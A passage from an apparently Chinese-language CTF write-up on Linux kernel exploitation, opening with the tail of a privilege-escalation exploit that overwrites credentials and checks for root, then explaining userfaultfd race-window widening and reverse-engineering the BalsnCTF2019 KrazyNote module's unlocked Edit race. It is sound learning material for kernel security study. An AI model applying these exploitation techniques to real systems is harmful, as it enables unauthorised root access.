class="number">5</span>;i++)</span><br><span class="line">        <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">3</span>;i++)</span><br><span class="line">        <span class="keyword">final</span>[idx++] = <span class="number">0x0000003fffffffff</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0xffffffff8183e420</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0xffffffff8183e4a0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0xffff88800012f6a0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0xffff88800001f980</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">5</span>;i++)</span><br><span class="line">        <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">3</span>;i++)</span><br><span class="line">        <span class="keyword">final</span>[idx++] = <span class="number">0x0000003fffffffff</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0xffffffff8183e420</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0xffffffff8183e4a0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0xffff88800012f6a0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">final</span>[idx++] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    Read(fd,<span class="number">0xc7</span>,cred<span class="number">-0x000d00620000002e</span>L,<span class="number">0x100</span>*<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">char</span> zero[<span class="number">0x28</span>];</span><br><span class="line">    <span class="built_in">memset</span>(usr_buf,<span class="string">'\x00'</span>,<span class="number">0x30</span>);</span><br><span class="line">    usr_buf[<span class="number">0</span>] = <span class="string">'\x03'</span>;</span><br><span class="line">    Malloc(fd,<span class="number">2</span>,usr_buf);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">10</span>;i &gt; <span class="number">3</span>;i--)</span><br><span class="line">        Free(fd,i);</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        system(<span class="string">"id"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="使用userfaultfd缺页扩大窗口期"><a href="#使用userfaultfd缺页扩大窗口期" class="headerlink" title="使用userfaultfd缺页扩大窗口期"></a>使用userfaultfd缺页扩大窗口期</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>之前想复现n1ctf的babykernel和de1ctf的race，发现官方题解中都有mmap的部分，一直不是很理解，终于在先知上找到一篇相关的<a href="https://xz.aliyun.com/t/6653" target="_blank" rel="noopener">文章</a>，写的非常详细，因此自己实践了一下(照着exp打了一遍)，记录一下userfaultfd的使用</p>
<h3 id="BalsnCTF2019-KrazyNote"><a href="#BalsnCTF2019-KrazyNote" class="headerlink" title="BalsnCTF2019 KrazyNote"></a>BalsnCTF2019 KrazyNote</h3><h4 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h4><h6 id="页和虚内存"><a href="#页和虚内存" class="headerlink" title="页和虚内存"></a>页和虚内存</h6><p>内核的内存主要有两个区域，RAM和交换区，将要被使用的内存放在RAM，暂时用不到的内存放在交换区，内核控制交换进出的过程。RAM中的地址是物理地址，内核使用虚拟地址，其通过多级页表建立虚拟地址到物理地址的映射</p>
<h6 id="页调度和延迟加载"><a href="#页调度和延迟加载" class="headerlink" title="页调度和延迟加载"></a>页调度和延迟加载</h6><p>有的内存既不在RAM又不在交换区，比如mmap出来的内存，这块内存在读写它之前实际上并没有被创建（没有映射到实际的物理页），例如<code>mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE, fd, 0);</code>实际上并没有把fd对应的内容拷贝到这块区域，只是将地址<code>0x1337000</code>映射到<code>fd</code>这个文件。</p>
<p>当有以下代码访问时：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *a = (<span class="keyword">char</span> *)<span class="number">0x1337000</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"content: %c\n"</span>, a[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
<p>内核会做以下事情：</p>
<ol>
<li>为0x1337000创建物理帧</li>
<li>从fd读取内容到0x1337000</li>
<li>增加一个页表的索引</li>
</ol>
<p>总之，如果是初次访问mmap的页，<code>耗时会很长，导致上下文切换以及当前线程的睡眠</code></p>
<h5 id="别名页"><a href="#别名页" class="headerlink" title="别名页"></a>别名页</h5><p>没有ABI可以直接访问物理帧，但内核有时候需要需要修改物理帧的值(例如修改页表入口)，于是引入了别名页，将物理帧映射到虚拟页。在每个线程的启动和退出过程中，一般都有两个物理帧映射到它。别名页的地址一般是<code>SOME_OFFSET+physical_addr</code></p>
<h5 id="userfaultfd机制"><a href="#userfaultfd机制" class="headerlink" title="userfaultfd机制"></a>userfaultfd机制</h5><p>这个机制可以让用户自己处理缺页，可以在用户空间定义一个<code>userfault handler</code>，用法见<a href="http://man7.org/linux/man-pages/man2/userfaultfd.2.html" target="_blank" rel="noopener">官方文档</a>。大概步骤如下：</p>
<ol>
<li>创建一个描述符uffd：所有的注册区间、配置和最终缺页处理都需要ioctl对这个fd进行处理。我们可以用UFFDIO_REGISTER注册一块监视区域，这个区域发生缺页的时候使用UFFDIO_COPY向缺页地址拷贝数据</li>
<li>用UFFDIO_REGISTER注册监视区域</li>
<li>创建专用线程用来轮询和处理缺页事件</li>
</ol>
<p>观察可以发现其中大部分操作都是固定的，我们可以自己整理一个头文件加进去，用的时候很方便。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_API,&amp;ua) == <span class="number">-1</span>)&#123;</span><br><span class="line">        ErrExit(<span class="string">"[-]ioctl UFFDIO API"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(mmap(FAULT_PAGE,<span class="number">0x1000</span>,<span class="number">7</span>,<span class="number">0x22</span>,<span class="number">-1</span>,<span class="number">0</span>) != FAULT_PAGE)</span><br><span class="line">        ErrExit(<span class="string">"[-]mmap failed!"</span>);</span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)FAULT_PAGE;</span><br><span class="line">    ur.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_REGISTER,&amp;ur) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]ioctl UFFDIO Register"</span>);</span><br><span class="line">    <span class="comment">//register the func</span></span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr,<span class="literal">NULL</span>,handler,(<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span>(s != <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]pthread create error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="comment">// 轮询uffd读到的信息需要存在一个struct uffd_msg对象中</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="comment">// ioctl的UFFDIO_COPY选项需要我们构造一个struct uffdio_copy对象</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line">      ......</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123; <span class="comment">// 此线程不断进行polling，所以是死循环</span></span><br><span class="line">        <span class="comment">// poll需要我们构造一个struct pollfd对象</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="comment">// 读出user-fault相关信息</span></span><br><span class="line">        read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="comment">// 对于我们所注册的一般user-fault功能，都应是UFFD_EVENT_PAGEFAULT这个事件</span></span><br><span class="line">        assert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line">        <span class="comment">// 构造uffdio_copy进而调用ioctl-UFFDIO_COPY处理这个user-fault</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        我们自己的处理逻辑</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// page(我们已有的一个页大小的数据)中page_size大小的内容将被拷贝到新分配的msg.arg.pagefault.address内存页中</span></span><br><span class="line">        ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy);</span><br><span class="line">          ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>这个内核模块逆的时候看起来很麻烦，结合别人博客的分析搞清楚了逻辑，其实是在<code>bss</code>上一块大小为<code>0x2000</code>的区域模拟<code>heap</code>的分配，首先搞清楚我们输入的数据结构和内核模块存储的单个数据结构。用户输入的结构体类型为<code>UserAttr</code>，其中<code>idx</code>指明note的索引，length对应分配的大小，user_buf为拷贝到note里content_arr的字符串或者从中读取数据的字符串。</p>
<p>一个note struct由四个成员组成，第一个是<code>key</code>，这个值根据原作者的分析是<code>task_struct.mm-&gt;pgd,页全局目录的存放位置)</code>,<code>length</code>是后面content_arr动态数组的大小(最大不超过0x100)，<code>contentPtr</code>保存的是<code>content_arr-page_offset_base</code>这里的<code>page_off_base</code>就是我们之前提到的那个别名页的<code>SOME_OFFSET</code>。最后的<code>content_arr</code>是一个动态数组，其大小由<code>New</code>的时候用户给的<code>length</code>决定</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">00000000 UserAttr        struc ; (sizeof=0x18, mappedto_3)</span></span><br><span class="line"><span class="comment">00000000                                         ; XREF: unlocked_ioctl/r</span></span><br><span class="line"><span class="comment">00000000 idx             dq ?                    ; XREF: unlocked_ioctl+26/w</span></span><br><span class="line"><span class="comment">00000000                                         ; unlocked_ioctl+6A/r ...</span></span><br><span class="line"><span class="comment">00000008 length          dq ?                    ; XREF: unlocked_ioctl+2E/w</span></span><br><span class="line"><span class="comment">00000008                                         ; unlocked_ioctl+6E/r ...</span></span><br><span class="line"><span class="comment">00000010 user_buf        dq ?                    ; XREF: unlocked_ioctl+4D/w</span></span><br><span class="line"><span class="comment">00000010                                         ; unlocked_ioctl:loc_1AE/r ...</span></span><br><span class="line"><span class="comment">00000018 UserAttr        ends</span></span><br><span class="line"><span class="comment">00000018</span></span><br><span class="line"><span class="comment">00000000 ; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">00000000</span></span><br><span class="line"><span class="comment">00000000 node            struc ; (sizeof=0x118, mappedto_4)</span></span><br><span class="line"><span class="comment">00000000 key             dq ?</span></span><br><span class="line"><span class="comment">00000008 length          dq ?</span></span><br><span class="line"><span class="comment">00000010 contentPtr      dq ?</span></span><br><span class="line"><span class="comment">00000018 content_arr     db 256 dup(?)</span></span><br><span class="line"><span class="comment">00000118 node            ends</span></span><br><span class="line"><span class="comment">00000118</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>从<code>init_module</code>开始，注册了一个设备在0x620，设备名下面就是用户自己定义的<code>file_ops</code>,而0x680全是空，也就是说全部使用默认的操作函数。看下源码会发现这里的<code>ioctl</code>是<code>unlocked_ioctl</code>也就是存在竞争</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">init_module</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(a1, a2, a3);</span><br><span class="line">  bufPtr = (node *)&amp;unk_B60;</span><br><span class="line">  <span class="keyword">return</span> misc_register(&amp;dev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">.data:0000000000000620 0B                      dev             db  0Bh                 ; DATA XREF: init_module+5↑o</span></span><br><span class="line"><span class="comment">.data:0000000000000620                                                                 ; cleanup_module+5↑o</span></span><br><span class="line"><span class="comment">.data:0000000000000621 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000622 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000623 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000624 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000625 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000626 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000627 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000628 9C 04 00 00 00 00 00 00                 dq offset aNote         ; "note"</span></span><br><span class="line"><span class="comment">.data:0000000000000630 80 06 00 00 00 00 00 00                 dq offset unk_680</span></span><br><span class="line"><span class="comment">.data:0000000000000638 00 00 00 00 00 00 00 00+                align 80h</span></span><br><span class="line"><span class="comment">.data:0000000000000680 00                      unk_680         db    0                 ; DATA XREF: .data:0000000000000630↑o</span></span><br><span class="line"><span class="comment">.data:0000000000000681 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000682 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000683 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000684 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000685 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000686 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000687 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000688 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000689 00                                      db    0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// file_operations结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">    <span class="keyword">loff_t</span> (*llseek) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*read_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*write_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line">    <span class="keyword">int</span> (*iopoll)(struct kiocb *kiocb, <span class="keyword">bool</span> spin);</span><br><span class="line">    <span class="keyword">int</span> (*iterate) (struct file *, struct dir_context *);</span><br><span class="line">    <span class="keyword">int</span> (*iterate_shared) (struct file *, struct dir_context *);</span><br><span class="line">    <span class="keyword">__poll_t</span> (*poll) (struct file *, struct poll_table_struct *);</span><br><span class="line">    <span class="keyword">long</span> (*unlocked_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line">    ... truncated</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>继续分析模块的功能会发现实现了四个功能，分别是<code>New</code>、<code>Delete</code>、<code>Show</code>和<code>Edit</code>。其中New的功能就是根据用户给的length从全局的内存中取一块作为<code>notes[req.idx]</code>并分配一块<code>content_arr[length]</code>，之后将全局指针对应向后偏移，拷贝的用户数据要先异或<code>key</code>再存入其中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)arg2 &lt;= -<span class="string">'\xFF'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)arg2 != <span class="number">-256</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-25</span>;</span><br><span class="line">    req.idx = <span class="number">-1L</span>L;                             <span class="comment">// -256-&gt;new</span></span><br><span class="line">    idx2 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      idx3 = (<span class="keyword">signed</span> <span class="keyword">int</span>)idx2;</span><br><span class="line">      <span class="keyword">if</span> ( !notes[idx2] )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++idx2 == <span class="number">0x10</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-14</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    new_node = bufPtr;</span><br><span class="line">    req.idx = idx3;</span><br><span class="line">    notes[idx3] = bufPtr;</span><br><span class="line">    new_node-&gt;length = v4;</span><br><span class="line">    new_node_content_arr = new_node-&gt;content_arr;</span><br><span class="line">    new_node-&gt;key = *(_QWORD *)(*(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">0x7E8</span>) + <span class="number">0x50</span>LL);</span><br><span class="line">    user_n = req.length;</span><br><span class="line">    user_buf2 = req.user_buf;</span><br><span class="line">    bufPtr = (node *)((<span class="keyword">char</span> *)new_node + req.length + <span class="number">24</span>);<span class="comment">// mov it to next free space</span></span><br><span class="line">    <span class="keyword">if</span> ( req.length &gt; <span class="number">0x100</span>uLL )</span><br><span class="line">    &#123;</span><br><span class="line">      _warn_printk(<span class="string">"Buffer overflow detected (%d &lt; %lu)!\n"</span>, <span class="number">0x100</span>LL, req.length);</span><br><span class="line">      BUG();</span><br><span class="line">    &#125;</span><br><span class="line">    _check_object_size(encBuffer, req.length, <span class="number">0L</span>L);</span><br><span class="line">    copy_from_user(encBuffer, user_buf2, user_n);<span class="comment">// copy userbuf to stack</span></span><br><span class="line">    req_len = req.length;</span><br><span class="line">    node_addr2 = notes[req.idx];</span><br><span class="line">    <span class="keyword">if</span> ( req.length )</span><br><span class="line">    &#123;</span><br><span class="line">      i = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        encBuffer[i / <span class="number">8</span>] ^= node_addr2-&gt;key;    <span class="comment">// xor the key</span></span><br><span class="line">        i += <span class="number">8L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; req_len );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(new_node_content_arr, encBuffer, req_len);<span class="comment">// copy to the third node</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    node_addr2-&gt;contentPtr = (__int64)&amp;new_node_content_arr[-page_offset_base];<span class="comment">// set contentPtr</span></span><br></pre></td></tr></table></figure>
<p><code>Delete</code>函数清空全局内存区并将分配的指针指向开头。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)arg2 != <span class="number">-254</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      notes1 = notes;</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)arg2 == <span class="number">-253</span> )               <span class="comment">// -253-&gt;delete</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          *notes1 = <span class="number">0L</span>L;</span><br><span class="line">          ++notes1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( &amp;_check_object_size != (__int64 (__fastcall **)(_QWORD, _QWORD, _QWORD))notes1 );</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">        bufPtr = (node *)&amp;unk_B60;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;unk_B60, <span class="number">0</span>, <span class="number">0x2000</span>uLL);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-25</span>;</span><br></pre></td></tr></table></figure>
<p><code>Show</code>函数按照<code>notes[idx].length</code>把<code>content_arr</code>内容拷贝到用户态空间，这个过程是先拿<code>contentPtr+page_offset_base</code>找到<code>content_arr</code>，再把其中的内容异或<code>key</code>拷贝</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v10 = notes[idx];                           <span class="comment">// -254-&gt;show</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = LOBYTE(v10-&gt;length);</span><br><span class="line">      v12 = (_DWORD *)(v10-&gt;contentPtr + page_offset_base);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11 &gt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(__int64 *)((<span class="keyword">char</span> *)&amp;encBuffer[<span class="number">-1</span>] + LOBYTE(v10-&gt;length)) = *(_QWORD *)((<span class="keyword">char</span> *)v12 + LOBYTE(v10-&gt;length) - <span class="number">8</span>);</span><br><span class="line">        qmemcpy(encBuffer, v12, <span class="number">8L</span>L * ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v11 - <span class="number">1</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v11 &amp; <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(encBuffer[<span class="number">0</span>]) = *v12;</span><br><span class="line">        *(_DWORD *)((<span class="keyword">char</span> *)encBuffer + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11 - <span class="number">4</span>) = *(_DWORD *)((<span class="keyword">char</span> *)v12 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11 - <span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( LOBYTE(v10-&gt;length) )</span><br><span class="line">      &#123;</span><br><span class="line">        LOBYTE(encBuffer[<span class="number">0</span>]) = *(_BYTE *)v12;</span><br><span class="line">        <span class="keyword">if</span> ( v11 &amp; <span class="number">2</span> )</span><br><span class="line">          *(_WORD *)((<span class="keyword">char</span> *)encBuffer + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11 - <span class="number">2</span>) = *(_WORD *)((<span class="keyword">char</span> *)v12 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11 - <span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v11 )</span><br><span class="line">      &#123;</span><br><span class="line">        v13 = <span class="number">0L</span>L;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          encBuffer[v13 / <span class="number">8</span>] ^= v10-&gt;key;</span><br><span class="line">          v13 += <span class="number">8L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v13 &lt; v11 );</span><br><span class="line">      &#125;</span><br><span class="line">      user_buf3 = req.user_buf;</span><br><span class="line">      _check_object_size(encBuffer, v11, <span class="number">1L</span>L);</span><br><span class="line">      copy_to_user(user_buf3, encBuffer, v11);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>Edit函数和Show差不多，也是先计算再拷贝，这里的问题就是<code>copy_from_user</code>并不是原子性的操作，也并没有上锁，按照我们之前的分析缺页可以让其有一个很大的空窗期供我们操作，进而利用竞争改掉某些关键数据</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)arg2 == -<span class="string">'\xFF'</span> )                <span class="comment">// -255-&gt;edit</span></span><br><span class="line">&#123;</span><br><span class="line">  node_addr = notes[idx];</span><br><span class="line">  <span class="keyword">if</span> ( node_addr )</span><br><span class="line">  &#123;</span><br><span class="line">    chunk_size = LOBYTE(node_addr-&gt;length);</span><br><span class="line">    user_buf1 = req.user_buf;</span><br><span class="line">    v18 = (_QWORD *)(node_addr-&gt;contentPtr + page_offset_base);<span class="comment">// recover</span></span><br><span class="line">    _check_object_size(encBuffer, chunk_size, <span class="number">0L</span>L);</span><br><span class="line">    copy_from_user(encBuffer, user_buf1, chunk_size);</span><br><span class="line">    <span class="keyword">if</span> ( chunk_size )</span><br><span class="line">    &#123;</span><br><span class="line">      node_addr1 = notes[req.idx];</span><br><span class="line">      cpy_idx = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        encBuffer[cpy_idx / <span class="number">8</span>] ^= node_addr1-&gt;key;</span><br><span class="line">        cpy_idx += <span class="number">8L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( chunk_size &gt; cpy_idx );</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size &gt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *v18 = encBuffer[<span class="number">0</span>];</span><br><span class="line">        *(_QWORD *)((<span class="keyword">char</span> *)v18 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size - <span class="number">8</span>) = *(__int64 *)((<span class="keyword">char</span> *)&amp;encBuffer[<span class="number">-1</span>]</span><br><span class="line">                                                                             + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">        qmemcpy(</span><br><span class="line">          (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> __int64)(v18 + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL),</span><br><span class="line">          (<span class="keyword">const</span> <span class="keyword">void</span> *)((<span class="keyword">char</span> *)encBuffer - ((<span class="keyword">char</span> *)v18 - ((<span class="keyword">unsigned</span> __int64)(v18 + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL))),</span><br><span class="line">          <span class="number">8L</span>L * (((<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size + (_DWORD)v18 - (((_DWORD)v18 + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFF8</span>)) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      